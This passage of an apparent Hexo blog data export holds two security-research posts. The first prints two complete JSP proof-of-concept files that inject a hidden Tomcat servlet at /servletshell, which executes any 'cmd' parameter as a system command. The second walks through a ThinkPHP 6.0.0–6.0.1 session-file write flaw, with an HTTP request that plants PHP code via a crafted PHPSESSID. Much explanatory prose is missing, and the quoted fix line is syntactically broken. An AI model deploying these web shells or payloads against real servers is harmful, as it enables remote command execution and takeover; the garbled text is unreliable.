&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p></p>\n<p> addservletpoc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">      //wrapper</span><br><span class=\"line\">    Servletshell shell=new Servletshell()</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>servlet</p>\n"},{"title":"thinkphp6","date":"2022-11-13T14:53:21.000Z","excerpt":"thinkphp6","_content":"\n# thinkphp6\n\n###tips\n\nthinkphp6.0.0~6.0.1\n\n\n## .\n\n`phpstudy`\n\n#### 1.phpstudy\n\n\n\nhttps://www.xp.cn/download.html\n\n#### 2.composer\n\n![-1667831973498](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png)\n\ncomposer1.8.5\n\ntp6\n\n```\ncomposer self-update//\n```\n\n#### 3.\n\n#### ![-1667831982656](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png)4.tp6\n\n`composer`\n\n```\ncomposer create-project topthink/think tp6    //tp6\n```\n\n\n\n![-1667831995098](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png)\n\n\n\n![-1667832028137](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png)\n\n\n\n## .\n\n#### 1.\n\nsessionidxxx.phpsessionidsessiongetshell\n\n sessionid\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n121\n\n```php\n $this->id = is_string($id) && strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());\n```\n\nsessionid32\n\n\n\nsession\n\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n\n254\n\n```php\n\tpublic function save(): void\n    {\n        $this->clearFlashData();\n\n        $sessionId = $this->getId();\n\n        if (!empty($this->data)) {\n            $data = $this->serialize($this->data);\n\n            $this->handler->write($sessionId, $data);\n        } else {\n            $this->handler->delete($sessionId);\n        }\n\n        $this->init = false;\n    }\n\n\n```\n\nsession id  `$this->handler->write($sessionId, $data);;`\n handler\n   SessionHandlerInterface $handler\n\n```php\npublic function __construct($name, SessionHandlerInterface $handler, array $serialize = null)\n    {\n        $this->name    = $name;\n        $this->handler = $handler;\n\n        if (!empty($serialize)) {\n            $this->serialize = $serialize;\n        }\n\n        $this->setId();\n    }\n```\n\n tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php\n  PHPSESSID  session id\n\n```php\n  if ($varSessionId && $request->request($varSessionId)) {\n            $sessionId = $request->request($varSessionId);\n        } else {\n            $sessionId = $request->cookie($cookieName);\n        }\n\n        if ($sessionId) {\n            $this->session->setId($sessionId);\n\n```\n\n```php\n$request->cookie($cookieName);\n\nprotected $name = 'PHPSESSID'; \n\n//PHPSESSID\n\n```\n\nStore  setId(32 \n\nsession tp6/vendor/topthink/framework/src/think/session/Store.php\n write\n\n```php\n$this->handler->write($sessionId, $data);\n// handler   think\\session\\driver\\file.php\n```\n\nwrite\n tp6/vendor/topthink/framework/src/think/session/driver/File.php\n\n```php\npublic function write(string $sessID, string $sessData): bool\n    {\n        $filename = $this->getFileName($sessID, true);\n        $data     = $sessData;\n\n        if ($this->config['data_compress'] && function_exists('gzcompress')) {\n            //\n            $data = gzcompress($data, 3);\n        }\n\n        return $this->writeFile($filename, $data);\n    }\n\n```\n\n\n\n```php\ngetFileName($sessID, true);\n```\n\n```php\nprotected function getFileName(string $name, bool $auto = false): string\n    {\n        if ($this->config['prefix']) {\n            // \n            $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;\n        } else {\n            $name = 'sess_' . $name;\n        }\n\n        $filename = $this->config['path'] . $name;\n        $dir      = dirname($filename);\n\n        if ($auto && !is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // \n            }\n        }\n\n        return $filename;\n    }\n\n```\n\n\n\n `$this->writeFile($filename, $data);`\n\n```php\n protected function writeFile($path, $content): bool\n    {\n        return (bool) file_put_contents($path, $content, LOCK_EX);\n    }\n```\n\nxxxxx.php\n\n#### 2.\n\n`burpsuite`\n\n```\nGET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1\nHost: tp6.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53\nUpgrade-Insecure-Requests: 1\n\n```\n\nPHPSESSID\n\n**<u>32</u>**\n\n```\nPHPSESSID=1234567890123456789012345678.php\n```\n\n./runtime/session/\n \n /runtime/session/sess_1234567890123456789012345678.php\n\n![-1667832045580](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png)\n\n\n\n#### 3.\n\nsessionid32`ctype_alnum`\n\n> ## PHP ctype_alnum() **(**PHP ctype_alnum() function**)**\n>\n> **ctype_alnum() function** is a character type (CType) function in PHP, it is used to check whether a given string [contains](https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020) alphanumeric characters or not.\n>\n> **ctype_alnum()**PHP(CType) \n>\n> It returns true  if the string contains alphanumeric value (i.e. alphabets, digits/number only), else it returns false.\n>\n> true -(/)FALSE \n\n\n\n```php\n$this->id = is_string($id) && strlen($id) === 32 ctype_alnum$id && ? $id : md5(microtime(true) . session_create_id());\n\n```","source":"_posts/thinkphp6.md","raw":"---\ntitle: thinkphp6\ndate: 2022-11-13 22:53:21\nexcerpt: thinkphp6\ncategories: \n---\n\n# thinkphp6\n\n###tips\n\nthinkphp6.0.0~6.0.1\n\n\n## .\n\n`phpstudy`\n\n#### 1.phpstudy\n\n\n\nhttps://www.xp.cn/download.html\n\n#### 2.composer\n\n![-1667831973498](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png)\n\ncomposer1.8.5\n\ntp6\n\n```\ncomposer self-update//\n```\n\n#### 3.\n\n#### ![-1667831982656](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png)4.tp6\n\n`composer`\n\n```\ncomposer create-project topthink/think tp6    //tp6\n```\n\n\n\n![-1667831995098](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png)\n\n\n\n![-1667832028137](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png)\n\n\n\n## .\n\n#### 1.\n\nsessionidxxx.phpsessionidsessiongetshell\n\n sessionid\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n121\n\n```php\n $this->id = is_string($id) && strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());\n```\n\nsessionid32\n\n\n\nsession\n\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n\n254\n\n```php\n\tpublic function save(): void\n    {\n        $this->clearFlashData();\n\n        $sessionId = $this->getId();\n\n        if (!empty($this->data)) {\n            $data = $this->serialize($this->data);\n\n            $this->handler->write($sessionId, $data);\n        } else {\n            $this->handler->delete($sessionId);\n        }\n\n        $this->init = false;\n    }\n\n\n```\n\nsession id  `$this->handler->write($sessionId, $data);;`\n handler\n   SessionHandlerInterface $handler\n\n```php\npublic function __construct($name, SessionHandlerInterface $handler, array $serialize = null)\n    {\n        $this->name    = $name;\n        $this->handler = $handler;\n\n        if (!empty($serialize)) {\n            $this->serialize = $serialize;\n        }\n\n        $this->setId();\n    }\n```\n\n tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php\n  PHPSESSID  session id\n\n```php\n  if ($varSessionId && $request->request($varSessionId)) {\n            $sessionId = $request->request($varSessionId);\n        } else {\n            $sessionId = $request->cookie($cookieName);\n        }\n\n        if ($sessionId) {\n            $this->session->setId($sessionId);\n\n```\n\n```php\n$request->cookie($cookieName);\n\nprotected $name = 'PHPSESSID'; \n\n//PHPSESSID\n\n```\n\nStore  setId(32 \n\nsession tp6/vendor/topthink/framework/src/think/session/Store.php\n write\n\n```php\n$this->handler->write($sessionId, $data);\n// handler   think\\session\\driver\\file.php\n```\n\nwrite\n tp6/vendor/topthink/framework/src/think/session/driver/File.php\n\n```php\npublic function write(string $sessID, string $sessData): bool\n    {\n        $filename = $this->getFileName($sessID, true);\n        $data     = $sessData;\n\n        if ($this->config['data_compress'] && function_exists('gzcompress')) {\n            //\n            $data = gzcompress($data, 3);\n        }\n\n        return $this->writeFile($filename, $data);\n    }\n\n```\n\n\n\n```php\ngetFileName($sessID, true);\n```\n\n```php\nprotected function getFileName(string $name, bool $auto = false): string\n    {\n        if ($this->config['prefix']) {\n            // \n            $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;\n        } else {\n            $name = 'sess_' . $name;\n        }\n\n        $filename = $this->config['path'] . $name;\n        $dir      = dirname($filename);\n\n        if ($auto && !is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // \n            }\n        }\n\n        return $filename;\n    }\n\n```\n\n\n\n `$this->writeFile($filename, $data);`\n\n```php\n protected function writeFile($path, $content): bool\n    {\n        return (bool) file_put_contents($path, $content, LOCK_EX);\n    }\n```\n\nxxxxx.php\n\n#### 2.\n\n`burpsuite`\n\n```\nGET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1\nHost: tp6.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53\nUpgrade-Insecure-Requests: 1\n\n```\n\nPHPSESSID\n\n**<u>32</u>**\n\n```\nPHPSESSID=1234567890123456789012345678.php\n```\n\n./runtime/session/\n \n /runtime/session/sess_1234567890123456789012345678.php\n\n![-1667832045580](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png)\n\n\n\n#### 3.\n\nsessionid32`ctype_alnum`\n\n> ## PHP ctype_alnum() **(**PHP ctype_alnum() function**)**\n>\n> **ctype_alnum() function** is a character type (CType) function in PHP, it is used to check whether a given string [contains](https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020) alphanumeric characters or not.\n>\n> **ctype_alnum()**PHP(CType) \n>\n> It returns true  if the string contains alphanumeric value (i.e. alphabets, digits/number only), else it returns false.\n>\n> true -(/)FALSE \n\n\n\n```php\n$this->id = is_string($id) && strlen($id) === 32 ctype_alnum$id && ? $id : md5(microtime(true) . session_create_id());\n\n```","slug":"thinkphp6","published":1,"updated":"2024-04-17T08:43:00.807Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7j3000lh776ev30c38r","content":"<h1 id=\"thinkphp6\"><a href=\"#thinkphp6\" class=\"headerlink\" title=\"thinkphp6\"></a>thinkphp6</h1><p>###tips</p>\n<p>thinkphp6.0.0~6.0.1</p>\n<h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\".\"></a>.</h2><p><code>phpstudy</code></p>\n<h4 id=\"1-phpstudy\"><a href=\"#1-phpstudy\" class=\"headerlink\" title=\"1.phpstudy\"></a>1.phpstudy</h4><p></p>\n<p><a class=\"link\"   href=\"https://www.xp.cn/download.html\" >https://www.xp.cn/download.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"2-composer\"><a href=\"#2-composer\" class=\"headerlink\" title=\"2.composer\"></a>2.composer</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png\"\n                        alt=\"-1667831973498\"\n                 ></p>\n<p>composer1.8.5</p>\n<p>tp6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer self-update//</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h4><h4 id=\"4-tp6\"><a href=\"#4-tp6\" class=\"headerlink\" title=\"4.tp6\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png\"\n                        alt=\"-1667831982656\"\n                 >4.tp6</h4><p><code>composer</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer create-project topthink/think tp6    //tp6</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png\"\n                        alt=\"-1667831995098\"\n                 ></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png\"\n                        alt=\"-1667832028137\"\n                 ></p>\n<h2 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\".\"></a>.</h2><h4 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h4><p>sessionidxxx.phpsessionidsessiongetshell</p>\n<p> sessionid<br><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code><br>121</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br></pre></td></tr></table></figure>\n\n<p>sessionid32</p>\n<p>session</p>\n<p><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code></p>\n<p>254</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">save</span>(<span class=\"params\"></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">clearFlashData</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable\">$sessionId</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getId</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;data)) &#123;</span><br><span class=\"line\">           <span class=\"variable\">$data</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$this</span>-&gt;data);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">delete</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;init = <span class=\"literal\">false</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>session id  <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br> handler<br>   SessionHandlerInterface $handler</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, SessionHandlerInterface <span class=\"variable\">$handler</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$serialize</span> = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    